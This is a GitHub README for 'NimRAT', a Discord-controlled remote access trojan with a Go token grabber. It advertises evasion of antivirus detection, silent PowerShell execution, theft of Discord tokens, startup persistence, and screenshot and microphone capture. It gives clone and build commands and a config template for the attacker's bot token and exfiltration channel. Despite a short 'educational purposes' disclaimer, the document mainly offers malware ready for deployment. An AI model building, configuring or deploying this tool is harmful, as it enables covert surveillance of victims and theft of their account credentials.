
# NimRAT

A simple discord-based remote access tool using Nim and Go.


## Features

- Not Python
- Only 2 detections on VirusTotal for main payload and 1 detection on VirusTotal for token grabber
- 3-4mb payload
- No server needed - communication via discord bot
- Execute silent powershell commands
- Collect discord tokens
- Upload/Download files
- Add to startup
- Make screenshots and record microphone
- And more!


## Requirements

You should have Nim and Go installed. Nim for the main payload, Go for discord tokens. If you don't want to compile the token grabber yourself, you can skip Go installation.

Download Nim - https://nim-lang.org/install.html

Download Go - https://go.dev/doc/install

## Installation and usage

Clone the GitHub repository

```bash
git clone https://github.com/WipingAllOut/NimRAT
cd NimRAT
```

Note: if you want to compile the token grabber yourself and not use the exe provided in this repository, follow these steps:

```bash
cd GoTokenGrabber
go build
```

Open modules/config.nim with any text editor and change values

```nim
let newUsersChannelId* = "" # You will be notified about new users in this channel
let tokenDecryptorUrl* = "" # You can leave it as is or upload your token grabber 
let discordToken* = "" # Your discord bot token (https://discord.com/developers/applications)
```

Now launch `compile.bat` and select option 3. If no errors occur, your payload will be in the same folder, `program.exe`.


## TODO
- [ ]  Get user's data from discord token (username, has nitro, etc)  
- [ ]  Get tdata
## Disclaimer

This project is for educational purposes only and aims to promote learning about cybersecurity and ethical hacking.

Prohibited Uses:

- Do not use this tool for illegal, unethical, or malicious activities.
- Use it only in controlled environments with proper authorization.

The author assumes no liability for misuse, damage, or legal issues resulting from this tool. By using this software, you agree to comply with all applicable laws and take full responsibility for your actions.
## Credits

https://github.com/Aaron2599/Discord-Token-Decrypt  
https://github.com/Peroxidelol/Discord-RAT
